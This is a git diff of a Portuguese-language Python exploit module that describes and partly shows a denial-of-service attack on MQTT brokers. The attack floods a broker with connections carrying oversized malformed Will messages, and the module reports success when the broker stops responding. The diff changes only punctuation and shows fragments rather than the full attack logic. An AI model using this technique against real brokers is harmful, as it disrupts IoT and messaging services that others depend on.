@@ -1,4 +1,4 @@
-# Absorvido do EmbedXPL-Forge — Andre Henrique (@mrhenrike)
+# Absorvido do EmbedXPL-Forge - Andre Henrique (@mrhenrike)
 # Adaptado para WirelessXPL-Forge
 """MQTT Broker DoS via Rapid CONNECT/DISCONNECT com Will Messages Malformadas.
 
@@ -23,7 +23,7 @@ class Exploit(Exploit):
 
     Sobrecarrega brokers MQTT abrindo conexões com mensagens LWT oversized
     e desconectando imediatamente. Cada ciclo força alocação de memória para
-    armazenamento do will e cleanup subsequente — exaure recursos e causa
+    armazenamento do will e cleanup subsequente - exaure recursos e causa
     degradação de serviço ou DoS completo.
     """
 
@@ -167,7 +167,7 @@ class Exploit(Exploit):
             print_error(f"Broker MQTT não acessível em {self.target}:{self.port}")
             return
 
-        print_success("Broker confirmado — iniciando ataque")
+        print_success("Broker confirmado - iniciando ataque")
 
         stats = {"cycles": 0, "errors": 0, "lock": threading.Lock()}
         stop_event = threading.Event()
@@ -197,6 +197,6 @@ class Exploit(Exploit):
         if alive:
             print_warning("Broker ainda responde (pode estar degradado)")
         else:
-            print_success("Broker não responde — DoS bem-sucedido")
+            print_success("Broker não responde - DoS bem-sucedido")
 
         print_info("Mitigação: rate limiting de CONNECT, max_inflight_messages, upgrade Mosquitto >= 1.6.x")
